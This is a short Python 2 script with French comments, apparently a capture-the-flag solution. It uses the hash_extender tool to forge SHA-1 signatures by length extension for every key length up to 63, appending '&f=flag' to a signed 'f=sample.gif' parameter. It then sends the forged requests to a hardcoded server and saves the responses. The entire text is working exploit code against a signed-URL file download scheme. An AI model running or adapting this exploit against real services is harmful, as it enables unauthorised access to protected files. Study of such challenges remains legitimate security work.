#!/usr/bin/env python2
#coding:utf8
import requests
import os

#Cela permettra de gérer le coding URL
import urllib as ul

#Lancement du script en mettant la sortie dans le fichier out
for i in range(64):
	os.system('./hash_extender -f sha1 -l '+str(i)+' --data "f=sample.gif" -s 952bb2a215b032abe27d24296be099dc3334755c --append "&f=flag" >> output/out')

#Lecture du fichier out
p = open("output/out","r").read().split("signature")

#Requetes vers le site avec les précédents résultats calculés
output=""
for i in p[1:]:
	#Les replaces permettent de remettre le '=' et le '&' en caractère lisible dans l'url et non encodé
	url="http://35.198.133.163:1337/files/"+i.split(": ")[1].split("\n")[0]+"/?"+ul.quote(i.split("string: ")[1].split("\n")[0].decode("hex")).replace("%3D","=").replace("%26","&")
	output+=requests.get(url).content+"\n\n------\n\n"

j=0
for i in output.split("\n------\n"):
	open("output/out"+str(j)+".gif","w").write(i)
	j+=1
	
print "Fin du script"